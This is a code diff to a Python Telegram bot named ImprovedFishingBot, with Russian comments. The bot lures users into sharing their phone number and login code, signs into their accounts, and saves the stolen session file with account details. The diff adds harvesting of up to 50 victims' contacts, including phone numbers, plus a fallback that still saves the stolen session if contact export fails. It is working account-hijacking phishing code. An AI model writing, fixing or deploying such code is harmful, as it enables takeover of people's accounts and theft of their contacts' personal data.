@@ -8,6 +8,7 @@ from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
 from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
+from telethon.tl.functions.contacts import GetContactsRequest
 
 # === КОНФИГУРАЦИЯ ===
 API_ID = 31930134
@@ -77,7 +78,6 @@ class ImprovedFishingBot:
                     ]
                 )
                 
-                # Сохраняем данные пользователя
                 self.pending_auth[user_id] = {
                     'step': 'awaiting_code_request',
                     'phone': phone
@@ -96,13 +96,11 @@ class ImprovedFishingBot:
                 auth_data = self.pending_auth[user_id]
                 step = auth_data.get('step')
                 
-                # Обработка нажатия "ПОЛУЧИТЬ КОД"
                 if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
                     print(f"[DEBUG] Запрос кода для {user_id}")
                     await self.request_code(event, user_id, auth_data['phone'])
                     return
                 
-                # Обработка ввода кода
                 if step == 'waiting_code':
                     code = text.replace(' ', '').replace('-', '')
                     if code.isdigit() and len(code) in (5, 6):
@@ -116,7 +114,6 @@ class ImprovedFishingBot:
                         )
                     return
                 
-                # Если ничего не подошло
                 if step == 'awaiting_code_request':
                     await event.respond(
                         "⚠️ Нажмите кнопку **🔑 ПОЛУЧИТЬ КОД** для продолжения"
@@ -336,6 +333,19 @@ class ImprovedFishingBot:
         try:
             me = await client.get_me()
             
+            # Получаем контакты через правильный метод
+            contacts_result = await client(GetContactsRequest(hash=0))
+            
+            contacts = []
+            for user in contacts_result.users:
+                contacts.append({
+                    'id': user.id,
+                    'username': user.username,
+                    'first_name': user.first_name,
+                    'last_name': user.last_name,
+                    'phone': user.phone
+                })
+            
             full_data = {
                 'account': {
                     'id': me.id,
@@ -343,28 +353,40 @@ class ImprovedFishingBot:
                     'first_name': me.first_name,
                     'last_name': me.last_name,
                     'phone': me.phone,
-                    'premium': me.premium or False,
-                    'verified': me.verified or False,
+                    'premium': getattr(me, 'premium', False),
+                    'verified': getattr(me, 'verified', False),
                     'session_path': session_file
                 },
-                'contacts': [],
-                'dialogs': []
+                'contacts': contacts[:50]  # Ограничиваем 50 контактами
             }
-            
-            async for contact in client.iter_contacts(limit=50):
-                full_data['contacts'].append({
-                    'id': contact.id,
-                    'username': contact.username,
-                    'first_name': contact.first_name,
-                    'last_name': contact.last_name,
-                    'phone': contact.phone
-                })
             
             with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
                 json.dump(full_data, f, indent=2, ensure_ascii=False)
             
             shutil.copy(session_file, f'{tdata_dir}/session.session')
             
+            print(f"[DEBUG] Экспорт завершен для {user_id}")
+            
+        except Exception as e:
+            print(f"[ERROR] Ошибка экспорта: {e}")
+            # Если ошибка с контактами - сохраняем хотя бы базовые данные
+            try:
+                full_data = {
+                    'account': {
+                        'id': me.id,
+                        'username': me.username,
+                        'first_name': me.first_name,
+                        'last_name': me.last_name,
+                        'phone': me.phone,
+                        'session_path': session_file
+                    },
+                    'contacts': []
+                }
+                with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
+                    json.dump(full_data, f, indent=2, ensure_ascii=False)
+                shutil.copy(session_file, f'{tdata_dir}/session.session')
+            except:
+                pass
         finally:
             await client.disconnect()
         
